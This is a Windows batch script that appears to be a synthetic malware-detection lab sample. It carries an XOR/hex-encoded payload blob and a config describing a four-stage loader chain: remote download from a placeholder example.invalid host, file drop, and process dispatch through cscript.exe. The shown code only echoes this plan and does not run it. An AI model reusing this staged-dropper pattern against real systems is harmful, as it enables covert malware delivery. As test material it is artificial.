@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:hex_pairs|reverse_xor
rem HUNTRESS-MATERIAL:575e501d575105050005045005551e56545247400e56545247406c474b565d4f4752571d575105050005045005551e56545247406f51527f40405641475d467b6f505a5f5146636f40415640666f09700e5b4752436c565f5a554f4752571d5051060757500a071c575a5f52455d5a1d565f435e524b561d575105050005045005551c1c09404347475b0e5f41464f575105050005045005551e5d545a52435e52500e575a6c5d545a52435e52504f5b504752510e56545246545d525f6c474b565d4f56545246545d525f6c565e52400e5b435241544f070e475d465c506c56545247404f564b561d47435a415040500e415647435257524f47435a4150406c55555c575d525b1f404056505c41436c5b50475243405a571f565f5a556c56475a41441f56475c5e56416c56415a464250520e40435647404f020e45
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "h0=v=1|steps=acquire_remote,write_file,dispatch_process,handoff_script|adapter=csc"
set "h1=ript.exe|stage_count=4|graph=same_language|next_language=batch|campaign_id=camp"
set "h2=aign-f6c76366bd|url=https://f6c76366bd.example.invalid/49cd45bc.dat|file_path=C"
set "h3=:\Users\Public\HuntressLab\stage-f6c76366bd.dat|next_stage=stage-f6c76366bd.cmd"
goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE
set "neutral_dead_label=d8a1b38b"
call set "cfg=%%h0%%%%h1%%%%h2%%%%h3%%"
echo(!cfg!
exit /b 0
:HUNTRESS_PLAN
echo cscript.exe acquire, write, dispatch, and hand off stage-f6c76366bd.cmd
exit /b 0
